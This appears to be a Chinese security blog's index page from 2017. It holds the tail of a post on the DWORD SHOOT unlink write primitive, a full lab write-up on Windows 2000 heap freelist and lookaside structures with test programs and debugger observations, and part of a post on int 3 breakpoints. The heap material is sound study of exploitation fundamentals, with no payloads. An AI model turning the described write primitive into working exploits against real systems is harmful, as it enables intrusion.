<p>在执行最后一次8字节的内存请求时会把freelist[2]的最后一项（原来的h5）分配出去，这意味着将最后一个结点从双向链表中卸下。</p>
<p>如果直接修改在内存中h5堆块中的空表指针（当然攻击发生时是由于溢出改写的），那么应该能够观察到DWORD SHOOT现象。</p>
<p>如图所示，直接在调试器中手动将0x003606C8处的前向指针改为0x44444444,后向指针改为0x00000000。当最后一个分配函数被调用后，调试器被异常中断，原因是无法将0x44444444写入0x00000000.当然，如果把射击目标定位合法地址，这条指令执行后 0x44444444将会被写入目标。</p>
<h3 id="4-说明"><a href="#4-说明" class="headerlink" title="4 说明"></a>4 说明</h3><p>事实上，堆块的分配、释放、合并等操作都能引发DWORD SHOOT(因为都涉及链表操作)，甚至快表也可以用来制造DWORD SHOOT。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/24/堆溢出研究试验/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/24/堆溢出研究试验/" itemprop="url">堆溢出研究试验</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-24T15:43:07+08:00">
                2017-06-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><font color="#f00"><br>针对堆进行调试，我整整花了3天时间，中间多次想不再进行调试！开始觉得还没怎么调试就结束，这不太好...中间觉得离最终能够调试已经很近了，加油...最后觉得已经到了这一步了，放弃就怪可惜的<br>哎！人就是这样矛盾的生物<br></font>

<p>话归正传，我们来看看调试所需要的环境</p>
<table>
<thead>
<tr>
<th>软件</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows 2000虚拟机</td>
<td style="text-align:left">无论你用的VMware，亦或是Virtualbox，请确保windows 2000能够正常复制粘贴，很多朋友都是在此处浪费了大量时间，我也不例外</td>
</tr>
<tr>
<td>VC6.0</td>
<td style="text-align:left">无论是纯净版还是绿色版，只要能用即可！<br>注意在调试程序的时候勾选：工具-&gt;选项-&gt;调试中的实时调试 ；<br>而且还应该调成Release版本：组建(Build)-&gt;移除工程配置，双击other - Win32 Release</td>
</tr>
<tr>
<td><a href="http://www.ollydbg.de/" target="_blank" rel="external">Ollydbg</a></td>
<td style="text-align:left">建议大家使用Ollydbg110版本，因为我此版本测试通过！而吾爱破解专用版Ollydbg无法正常使用，大家切忌使用此版本，否则十分坑爹！<br>启动od，然后点击option-&gt;just-in-time debugging选中Make ollydbg Just-in-time debugger并确认，最后重启od</td>
</tr>
</tbody>
</table>
<h3 id="2-堆的数据结构"><a href="#2-堆的数据结构" class="headerlink" title="2. 堆的数据结构"></a>2. 堆的数据结构</h3><h4 id="2-1-堆块"><a href="#2-1-堆块" class="headerlink" title="2.1 堆块"></a>2.1 堆块</h4><p>1） 堆块分为块首和块身<br>块首是堆块头部的几个字节，用来标识这个堆块自身的信息，包括本块的大小、本块空闲还是占用等信息；<br>块身紧跟在块首后面的部分，是最终分配给用户使用的数据区。</p>
<p>2） 块首大小为（8字节）</p>
<p><img src="/images/2017-06-24/heap_structure.jpg" alt="堆块的基础数据结构"></p>
<p>3） 空闲态的堆块在块首后有两个指针</p>
<h4 id="2-2-堆表（空表和快表）"><a href="#2-2-堆表（空表和快表）" class="headerlink" title="2.2 堆表（空表和快表）"></a>2.2 堆表（空表和快表）</h4><p>位于堆区的起始位置，用于索引堆区中堆块的重要信息。堆表的数据结构决定了整个堆区的组织方式。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。</p>
<p>在windows中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。</p>
<p><img src="/images/2017-06-24/heap_list.png" alt="堆表"></p>
<h5 id="1）-空表：双向回环链表-Freelist"><a href="#1）-空表：双向回环链表-Freelist" class="headerlink" title="1） 空表：双向回环链表(Freelist)"></a>1） 空表：双向回环链表(Freelist)</h5><p>堆区一开始的堆表区中有一个128项的指针数组（看到有人说把它看成队列的），被称作空表索引。该数组的每一项包含两个指针，用于表示一条空表。<br>free[1] 标识了所有堆中所有大小为8字节的空闲堆块，之后每个索引指示的空闲堆块递增8个字节。即：<br>free[2]标识了16个字节的空闲堆块。<br>free[k] 标识了 k * 8 个字节的空闲堆块。<br>指示第1项空表索引比较特殊，从图中我们也可以看到：这条双向链表链入了所有大于等于1024字节的堆块（小于512KB），堆块按照升序排列。</p>
<p><img src="/images/2017-06-24/freelist.jpg" alt="空表"></p>
<h5 id="2）-快表：单向链表-Lookaside"><a href="#2）-快表：单向链表-Lookaside" class="headerlink" title="2） 快表：单向链表(Lookaside)"></a>2） 快表：单向链表(Lookaside)</h5><p>快速单项链表是Windows用来加速堆块分配而采用的一种堆表。这类单项链表不会发生堆块合并（其中的空闲块块首会被设置为占用态，用来防止堆块合并）。</p>
<p>快速单项链表有128条，组织结构与空闲双向链表类似，只是其中的堆块按照单项链表组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。</p>
<p><img src="/images/2017-06-24/lookaside.jpg" alt="快表"></p>
<h5 id="3）-区别"><a href="#3）-区别" class="headerlink" title="3） 区别"></a>3） 区别</h5><p>a) 以上两个都为128大小的指针数组 （空表每一项有两个指针，快表每一项有一个指针）<br>b) 快表最多只有四个节点<br>c) 空表除了数组的第一个元素外其他分别链接：数组下标*8 大小的堆块，数组的第一个元素链接着大于1kb的堆块，并升序排序<br>d) 快表的堆块处于占用状态，不会发生堆块合并<br>e) 快表的只存在精确分配，快表优先空表分配</p>
<h4 id="2-3-内存块"><a href="#2-3-内存块" class="headerlink" title="2.3 内存块"></a>2.3 内存块</h4><h5 id="小块（小于1kb）"><a href="#小块（小于1kb）" class="headerlink" title="小块（小于1kb）"></a>小块（小于1kb）</h5><p>分配方式：优先快表，其次空表非零元素（free[0]），然后堆缓存，最后空表零元素。否则就紧缩，然后再尝试。再否则就返回NULL<br>释放：优先链入快表（只能链入4个空闲块），如果快表满则链入相应的空表</p>
<h5 id="大块（大于1kb小于512kb）"><a href="#大块（大于1kb小于512kb）" class="headerlink" title="大块（大于1kb小于512kb）"></a>大块（大于1kb小于512kb）</h5><p>分配方式：优先堆缓存，其次空表零元素<br>释放： 优先放入堆缓存，若堆缓存满则链入freelist[0]</p>
<h5 id="巨块（大于512kb）"><a href="#巨块（大于512kb）" class="headerlink" title="巨块（大于512kb）"></a>巨块（大于512kb）</h5><p>分配方式：虚分配<br>释放：直接释放</p>
<h3 id="3-堆结构的验证和分析"><a href="#3-堆结构的验证和分析" class="headerlink" title="3 堆结构的验证和分析"></a>3 堆结构的验证和分析</h3><p>在堆中进行内存分配的时候，C语言函数调用的是malloc()函数，c++中调用new()函数，当动态调试进入函数内部的时候察觉此两个函数调用的都是底层ntdll.dll中的RtAllocateHeap()函数，所有的windows分配堆的函数在底层调用的都是此函数，这也死程序员可以看到的关于堆的最底层函数。因此研究堆分配，重点关注此函数即可。</p>
<h4 id="3-1-堆的调试"><a href="#3-1-堆的调试" class="headerlink" title="3.1 堆的调试"></a>3.1 堆的调试</h4><p>在此之前需要理解一个概念：调试堆与调试栈不同，不能直接加载或者attach 程序，否则堆管理策略就会采用调试状态下的堆管理策略，使用调试状态下的堆管理函数。</p>
<p>正常堆和调试堆的区别：<br>1.调试堆只采用空表分配，不采用快表分配<br>2.所有的堆块末尾都加上十六个字节的用来防止程序溢出，（仅仅是用来防止程序溢出，而不是堆溢出），其中这十六个字节包括：<font color="#f00">8个字节的0xAB 和 8个字节的0x00</font><br>3.块首的标志标志位不同，调试状态下的堆和正常堆的区别如同debug下的PE文件和release下的PE文件类似，做堆移除实验的时候，调试器中可以v正常运行的shellcode，单独运行却不行。很可能就是调试堆与正常堆的差异造成的。</p>
<p>为拉避免采用调试状态下的堆，我i们直接在程序中嵌入 int3 断点，然后调用实时调试器即可</p>
<h4 id="3-2-空表结构验证调试"><a href="#3-2-空表结构验证调试" class="headerlink" title="3.2 空表结构验证调试"></a>3.2 空表结构验证调试</h4><h5 id="3-2-1-验证代码"><a href="#3-2-1-验证代码" class="headerlink" title="3.2.1 验证代码"></a>3.2.1 验证代码</h5><pre><code>#include &lt;windows.h&gt;

int main()
{
     HLOCAL h1,h2,h3,h4,h5,h6;
     HANDLE hp;
     hp = HeapCreate(0, 0x1000, 0x10000);   //堆创建
     __asm int 3;

     h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3);  //申请内存
     h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5);
     h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 6);
     h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
     h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 19);
     h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);

     //free block and prevent coaleses
     //释放掉1、3、5,内存不相联不会发生堆块合并
     HeapFree(hp, 0 , h1);     // free to freelist[2]
     HeapFree(hp, 0 , h3);     // free to freelist[2]
     HeapFree(hp, 0 , h5);     // free to freelist[4]

     //内存相联，合并
     HeapFree(hp, 0 , h4);     // coalese h3, h4, h5, link the large  block to freelist[8]

     return 0;
}
</code></pre><h5 id="3-2-2-堆调试环境配置"><a href="#3-2-2-堆调试环境配置" class="headerlink" title="3.2.2 堆调试环境配置"></a>3.2.2 堆调试环境配置</h5><ol>
<li>在VC6.0中创建该工程，然后勾选：工具-&gt;选项-&gt;调试中的实时调试，并将运行结果设置为Release版本</li>
<li>在OllyDbg中&quot;Options&quot;菜单中选中&quot;Just-in-time debugging&quot;，单击&quot;Make OllyDbg just-in-time debugger&quot;，然后单击&quot;Done&quot;按钮确认。</li>
<li>运行上面程序之后，在系统出现错误提示的时候，选择&quot;取消&quot;<br><img src="/images/2017-06-24/debugging_mode.jpg" alt="选择调试"></li>
<li>然后可以在Ollydbg中进行调试，使用Alt+M可以查看当前内存映射状态，如图所示<br><img src="/images/2017-06-24/ollydbg.jpg" alt="OllyDbg中调试"></li>
</ol>
<h5 id="3-2-3-实验过程"><a href="#3-2-3-实验过程" class="headerlink" title="3.2.3 实验过程"></a>3.2.3 实验过程</h5><p>可以看出程序断点断在了VA=0x0040101D处，此时内存映射窗口也在上图中显示。其实你应该知道：进程堆地址为0x130000, S大小为0x6000。可以使用GetProcessHeap()获取函数句柄。<br><img src="/images/2017-06-24/process_heap.jpg" alt="获取进程堆地址"></p>
<p>其实本实验中的内存分配函数malloc()有属于自己的堆区（0x00340000，大小0x2000）.</p>
<h6 id="识别堆表"><a href="#识别堆表" class="headerlink" title="识别堆表"></a>识别堆表</h6><p>在程序初始化的过程中，malloc使用的堆和进程堆都已经经过了若干次分配和释放操作，里面的堆块相对比较“凌乱”，因此我们在程序中使用HeapCreate()函数创建一个新的堆，通过调试这个比较“整齐”的堆来理解堆管理。</p>
<font color="#f000">当HeapCreate()成功创建了堆区之后，会把整个堆区的起始地址返回给EAX，如上上图所示，地址为0x00360000</font><br>在内存映射窗口双击0x00360000地址所在行即可进入数据窗口。<br><font color="#f00">从0x00360000开始，堆表中包含的信息依次是段表索引（Segment List）、虚表索引（Virtual Allocation list）、空表使用标识（freelist usage bitmap）和空表索引区</font>

<p>当然，上面给出的区域并不完整，下面是我从网上找到的完整表述：</p>
<pre><code>
0:000> dt _HEAP 00080000
   +0x000 Entry           : _HEAP_ENTRY
   +0x008 Signature        : 0xeeffeeff
   +0x00c Flags           : 0x50000062
   +0x010 ForceFlags       : 0x40000060
   +0x014 VirtualMemoryThreshold : 0xfe00
   +0x018 SegmentReserve    : 0x100000
   +0x01c SegmentCommit     : 0x2000
   +0x020 DeCommitFreeBlockThreshold : 0x200
   +0x024 DeCommitTotalFreeThreshold : 0x2000
   +0x028 TotalFreeSize    : 0xcb
   +0x02c MaximumAllocationSize : 0x7ffdefff
   +0x030 ProcessHeapsListIndex : 1
   +0x032 HeaderValidateLength : 0x608
   +0x034 HeaderValidateCopy : (null)
   +0x038 NextAvailableTagIndex : 0
   +0x03a MaximumTagIndex  : 0
   +0x03c TagEntries       : (null)
   +0x040 UCRSegments      : (null)
   +0x044 UnusedUnCommittedRanges : 0x00080598 _HEAP_UNCOMMMTTED_RANGE
   +0x048 AlignRound       : 0x17
   +0x04c AlignMask        : 0xfffffff8
   <font color="#f00">+0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x80050 - 0x80050 ]</font>
   <font color="#f00">+0x058 Segments      : [64] 0x00080640 _HEAP_SEGMENT</font>
   +0x158 u                : __unnamed
   +0x168 u2               : __unnamed
   +0x16a AllocatorBackTraceIndex : 0
   <font color="#f00">+0x16c NonDedicatedListLength : 1</font>
   +0x170 LargeBlocksIndex : (null)
   +0x174 PseudoTagEntries : (null)
   <font color="#f00">+0x178 FreeLists    : [128] _LIST_ENTRY [ 0x829b0 - 0x829b0 ]</font>
   +0x578 LockVariable     : 0x00080608 _HEAP_LOCK
   +0x57c CommitRoutine    : (null)
   <font color="#f00">+0x580 FrontEndHeap  : 0x00080688</font>
   +0x584 FrontHeapLockCount : 0
   +0x586 FrontEndHeapType : 0x1 ''
   +0x587 LastSegmentIndex : 0 ''
</code></pre>


<p>可以明显看出，空表开始位置在0x00360178处，其余的堆块一般与溢出利用关系不大。<br>当一个堆刚刚被初始化时，它的堆块状况是非常简单的：</p>
<ul>
<li>只有一个空闲态的大块(称为“尾块”)</li>
<li>偏移0x178的位置是空表的头，可以参见介绍空表时所用的图。如图可以看到，当前的freelist[0]的值是0x00360688，而其他元素都指向自身(蓝框指向0x00360688,红框指向自身地址)。（启用块表后0x688位置就是快表）<br><img src="/images/2017-06-24/freelist_test.jpg" alt="空表头"></li>
<li>Freelist[0]指向“尾块”，八个字节（前四个字节是前向指针，后四个字节时后巷指针，即：空表的一对指针），其余各项指向本身</li>
<li>除零号空表索引外，其余各项索引都指向自己，这意味着其余所有的空闲链表都没有空闲块。</li>
</ul>
<p><img src="/images/2017-06-24/heap_structure.jpg" alt="占用态"><br><b><center>占用态</center></b><br><img src="/images/2017-06-24/heap_structure2.jpg" alt="空闲态"><br><b><center>空闲态</center></b></p>
<p><b>占用态和空闲态的共同点</b></p>
<p>0-2 字节代表本快的大小（包括块首）<br>2-4字节表示计算单位是多少字节</p>
<p><b>占用态与空闲态的不同点</b></p>
<p>Flags出 占用态标志是1  空闲态标志是 0</p>
<p>空闲态块首后的八个字节为一对指针，分别是前向指针和后向指针。当堆块变为占用态的时候重新回分配数据。</p>
<font color="#f00">实际上尾块的起始位置是 0x360680， 一般引用堆块的指针都会跃过8字节的块首，直接指向数据区</font>

<p>因此根据地址 0x360680处八个字节的情况(参见下图)可以知道：此尾块的大小是 0x130  计算单位是 0x0008 个字节  总大小是 0x980字节 (0x130 * 0x8 = 0x980)。<br><img src="/images/2017-06-24/freelist_first.jpg" alt="尾块"></p>
<font color="#f00">注意：堆块的大小是包含块首在内的</font>

<h6 id="堆块的分配"><a href="#堆块的分配" class="headerlink" title="堆块的分配"></a>堆块的分配</h6><p>上面也讲了，堆块在分配的时候会将块首计算在内。所以程序中的费喷情况如下：</p>
<table>
<thead>
<tr>
<th>堆句柄</th>
<th>请求字节数</th>
<th>实际需要的字节数</th>
<th>实际分配（堆单位）</th>
<th>实际分配（字节）</th>
</tr>
</thead>
<tbody>
<tr>
<td>H1</td>
<td>3</td>
<td>11</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H2</td>
<td>5</td>
<td>13</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H3</td>
<td>6</td>
<td>14</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H4</td>
<td>8</td>
<td>16</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H5</td>
<td>19</td>
<td>27</td>
<td>4</td>
<td>32</td>
</tr>
<tr>
<td>H6</td>
<td>24</td>
<td>32</td>
<td>4</td>
<td>32</td>
</tr>
</tbody>
</table>
<p>直接在CPU窗口，命令F8单步执行程序到地址:0x0040102B处，这时我们执行完了<br>h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3)<br>当h1被分配以后直接查看地址：0x00360178地址处的值（0x00360698）：<br><img src="/images/2017-06-24/freelist_test2.jpg" alt="h1"><br>此时的地址0x360178处的值已经从0x360688改变为0x360698  同时跳转到 0x360698,如下图：<br><img src="/images/2017-06-24/freelist_test3.jpg" alt="h1"><br>从图中可以看出：分配给h1的大小为0x0002, size=16bytes</p>
<font color="#00f"></font>

<p>接下来运行到地址0x00401059，此时h1~h6全部分配完，查看0x00360178的地址可以看出，值已经更改为0x00360708。接下来到0x00360680处进行查看</p>
<p>h1~h6的分配情况如下：<br><img src="/images/2017-06-24/freelist_test4.jpg" alt="h1-h6"></p>
<p>如上所示，现在的地址是：0x360700大小是0x120 = 0x130 - 0x2 * 4 - 0x4 * 2</p>
<p>以上从h1 - h6的分配情况验证啦 空表分配中的找零钱现象（从一个大块中依次一小块一小块地进行切割）</p>
<font color="#0f0">下面是我的一些思考：<br>首先，尾块上的指针指向什么？其实尾块上的指针表示的是没有分配完的区间有多大。因此如果要查看指针所指向的内容，应该找其Self Size中的内容。<br>例如上图中的0x700是尾块，那么h6中的data实际上应该是0x6E0~0x700。以此类推，可以找到h5，h4，h3，h2，h1中的数据雷荣。h1的堆块为0x680~0x690。<br></font>

<h6 id="堆块的释放"><a href="#堆块的释放" class="headerlink" title="堆块的释放"></a>堆块的释放</h6><p>接着上面的程序执行，直接执行到地址：00401077地址处<br>HeapFree(hp,0,h1); //free to freelist[2]<br>HeapFree(hp,0,h3); //free to freelist[2]<br>HeapFree(hp,0,h5); //free to freelist[4]<br>分别释放啦堆块 h1 h3 h5这样做是防止相邻堆块进行堆块的合并。直接查看地址 0x360178地址处的值重点观察变化的值如下图：<br><img src="/images/2017-06-24/freelist_test5.jpg" alt="地址变化"></p>
<p>从上图中可以发现地址 0x360188 的值发生啦变化 从原来的指向自身现在变为指向：0x360688  0x3608A8</p>
<p>地址0x360198处的值变化为： 0x003606C8 和 0x003606c8</p>
<p>由上图可知 h1 h3分别被释放到 freelist[2] 空表中， h5被释放到啦 freelist[4]空表中。</p>
<p>根据freelist【2】 的空表索引 以及h1 h3堆块的指针组，可以发现 ：<br><img src="/images/2017-06-24/freelist_test6.jpg" alt="链表结构"><br>如图所示左边箭头是前向指针，顺序为 Freelist -&gt; h1 &gt; h3  右边是后向指针 顺序是 h3&gt; h1 &gt; freelist[2]</p>
<p>对于h5堆块倒是没啥 ，freelist[5]直接索引到 地址 0x3606c8</p>
<h6 id="堆块的合并"><a href="#堆块的合并" class="headerlink" title="堆块的合并"></a>堆块的合并</h6><p>接着程序运行直接运行到地址 0x401080地址处，执行的是代码：</p>
<p>HeapFree(hp,0,h4); //coalese h3,h4,h5,link the large block to freelist[8]</p>
<p>当释放h4的时候会发生堆块的合并现象（两个连续的空闲块就会发生合并）。首先是先从空表中将三个空闲块摘下，重新计算合并后的堆块的大小，然后合并成新的空闲块，链入空表。如下图所示分别为空表索引区状态和合并后堆块状态：<br><img src="/images/2017-06-24/freelist_test7.jpg" alt="堆块状态"><br><img src="/images/2017-06-24/freelist_test8.jpg" alt="堆块状态"></p>
<p>如上图所所示：</p>
<ul>
<li>在0x188处的freelist[2]，原来标识的空表中有两个空闲块h1和h3，而现在只有一个h1，因为h3在合并时被摘下了。同理0x198处的freelist[4]也被摘下了。</li>
<li>在0x1B8处的freelist[8]，原来指向自身，现在指向合并后的新空闲块0x3606A8，处的值 0x0008 即是：合并后的堆块的大小。后八个字节的指针对，则指向空表的索引区。</li>
</ul>
<p><b>注意事项</b></p>
<p>以上是空表中的堆块的合并，并且只发生在空表中。</p>
<p>整个过程比较费时，繁琐，在强调效率的情况下，堆块合并就会被禁止，设置为占用太。</p>
<p>空表中第一个块的情况下不会向前发生合并，最后一个块不会向后进行合并。</p>
<h4 id="3-3-快表结构验证调试"><a href="#3-3-快表结构验证调试" class="headerlink" title="3.3 快表结构验证调试"></a>3.3 快表结构验证调试</h4><h5 id="3-3-1-验证代码"><a href="#3-3-1-验证代码" class="headerlink" title="3.3.1 验证代码"></a>3.3.1 验证代码</h5><pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

void main()
{
    HLOCAL h1,h2,h3,h4;
    HANDLE hp;
    hp = HeapCreate(0, 0, 0);
    __asm int 3

    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);

    HeapFree(hp, 0, h1);
    HeapFree(hp, 0, h2);
    HeapFree(hp, 0, h3);
    HeapFree(hp, 0, h4);

    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
    HeapFree(hp, 0, h2);
}
</code></pre><h5 id="3-3-2-实验过程"><a href="#3-3-2-实验过程" class="headerlink" title="3.3.2 实验过程"></a>3.3.2 实验过程</h5><p><img src="/images/2017-06-24/freelist_test9.jpg" alt="空表地址"><br><img src="/images/2017-06-24/lookaside_test.jpg" alt="快表地址"><br>首先在dump窗口中直接跳转至0x360178处，此处是快表地址，发现地址指向0x00361E90，不是原来的0x00360688。此时基本上可以看出有快表！<br>直接在dump窗口中进行跳转到0x360688处，此时发现快表为空。这也是为什么要反复申请释放内存的原因。<br>首先从FreeList[0]中依次申请8，8，16，24字节的内存，然后进行释放到快表中（快表未满时释放到快表中）。根据三个堆块的大小我们可以知道8字节的会被释放到Lookaside[1]中、16字节的会被释放到Lookaside[2]中、24字节的会被释放到Lookaside[3]中。</p>
<p>先运行程序到地址 0x40109F处。此时直接观察快表中的变化，此时发现仍然为空，下面运行释放程序，直接单步执行命令运行到地址：0x401106处，这是观察快表的变化如图所示：<br><img src="/images/2017-06-24/lookaside_test2.jpg" alt="快表测试1"></p>
<p>运行程序到地址 0x40110D处观察堆块是否链如快表：<br><img src="/images/2017-06-24/lookaside_test3.jpg" alt="运行状态"></p>
<p>如上图所示h1 - h4已经链接进入块表中并且都是处于占用态。 地址 0x361e90指向下一个堆块（因为h1 h2 同时为八字节的空闲堆块）</p>
<p>当程序运行到地址 0x40111D时（也就是执行完申请内存的代码时）<br>h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);<br>此时申请的堆块应该从块表中申请，此时查看堆表区的索引：<br><img src="/images/2017-06-24/lookaside_test4.jpg" alt="重新申请时的快表"><br><img src="/images/2017-06-24/lookaside_test5.jpg" alt="重新申请时的空表"><br>从以上两图中可以看到当继续申请内存的时候，是从快表lookside[2]处卸下的堆块。</p>
<p>当释放的时候，代码执行到0x401140,还是将空闲堆块释放到此处执行代码：<br>HeapFree(hp,0,h2);<br>执行完后继续查看上图中地址的值：<br><img src="/images/2017-06-24/lookaside_test6.jpg" alt="释放内存值快表"><br>如图所示：当释放完堆块后还是链接进入啦快表 looksize[2]</p>
<h4 id="3-4-快表中堆块与空表中堆块区别"><a href="#3-4-快表中堆块与空表中堆块区别" class="headerlink" title="3.4 快表中堆块与空表中堆块区别"></a>3.4 快表中堆块与空表中堆块区别</h4><ul>
<li>块首中的标志位为0x01，也就是这个堆块是Busy状态，这也是为什么快表中的堆块不进行合并操作的原因。</li>
<li>块首只存指向下一堆块的指针，不存在指向前一堆块的指针。</li>
</ul>
<p><br></p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.jianshu.com/p/83a47f833ca5" target="_blank" rel="external">堆溢出研究二</a><br><a href="http://blog.csdn.net/qq_21210995/article/details/60883572" target="_blank" rel="external">堆溢出（一）堆结构</a><br><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-heap" target="_blank" rel="external">!Heap</a><br><a href="http://www.informit.com/articles/article.aspx?p=1081496" target="_blank" rel="external">Advanced Windows Debugging: Memory Corruption Part II—Heaps</a><br><a href="http://xcon.xfocus.org/XCon2004/archives/14_Reliable%20Windows%20Heap%20Exploits_BY_SHOK.pdf" target="_blank" rel="external">Reliable Windows Heap Exploits BY SHOK</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/24/VC6-0进行软件断点调试/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/24/VC6-0进行软件断点调试/" itemprop="url">VC6.0进行软件断点调试</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-24T10:42:36+08:00">
                2017-06-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/编程技术/" itemprop="url" rel="index">
                    <span itemprop="name">编程技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><font color="#f00">VC6.0进行断点调试的时候，系统经常会提示应用程序错误，然后调试过程直接结束。所以我们急需解决vc6.0软件断点调试的解决办法。<br><br>VC中的Just-in-time调试,使用该调试模式应用程序可以在Visual C++开发环境之外运行知道发生一个错误.当遇到一个程序错误时,Just-in-time调试自动加载Visual C++ Debugger。<br><br>打开Just-in-time调试：修改Tools-&gt;Options-&gt;Debugging，选中Just-in-time debugging选项即可。(其实该选项所做的操作就是写了个注册表,将自己作为其他程序抛出异常时的处理程序,下面有介绍)<br></font>

<p>设置即时调试断点，在编译生成的Debug版本程序中加入断点异常，在代码中硬编码一个断点(相当于让程序出错)，让程序在到达程序员希望停止位置时加载已经打开源码的Debugger实现对该位置的调试。(当然没有源码也可以调试的，如果想调试汇编的话.)</p>
<ul>
<li><p>VC中的即时调试断点设置方法:DbgBreakPoint 或者 DebugBreak</p>
</li>
<li><p>C#中的即时调试断点设置方法:Debugger.Break</p>
</li>
<li><p>js中的即时调试断点设置方法:Debugger</p>
</li>
<li><p>ASP(VBS)中的即时调试断点设置方法:Stop</p>
</li>
</ul>
<p>###VC6.0调试 断点中断程序的执行(断点指令)</p>
<h4 id="断点指令"><a href="#断点指令" class="headerlink" title="断点指令"></a>断点指令</h4><p>那么我们就来说说什么是断点，断点是什么？不是F9 ，也不是那个小红球，在Intel系列的CPU（包括AMD生产的CPU）里面，它其实是一个特殊的指令：INT 3。CPU在执行程序的指令集的时候，只要碰到这个指令，就会中断程序的执行。</p>
<h5 id="引用的示例"><a href="#引用的示例" class="headerlink" title="引用的示例"></a>引用的示例</h5><p>当然我们需要用事实来证明我上面的话，因此把下面的程序编译并且执行一下，点“Yes”，点“Break”，程序就中断了.<br>以下为引用内容：</p>
<pre><code>#include &lt;stdio.h&gt;
void main()
{
   printf(&quot;Before breakpoint&quot;n&quot;);
   __asm
   {
     int 3
   }
   printf(&quot;Before breakpoint&quot;n&quot;);
}
</code></pre><p>断点是int 3这个指令触发的。</p>
<p>由int 3这个指令（当然是在intel系列的CPU上面）引申出来的函数 ：</p>
<table>
<thead>
<tr>
<th>语言/工具</th>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>C++</td>
<td>DebugBreak</td>
<td>在C++代码中硬编码一个断点。</td>
</tr>
<tr>
<td>C#</td>
<td>Debugger.Break</td>
<td>在.NET代码中硬编码一个断点</td>
</tr>
<tr>
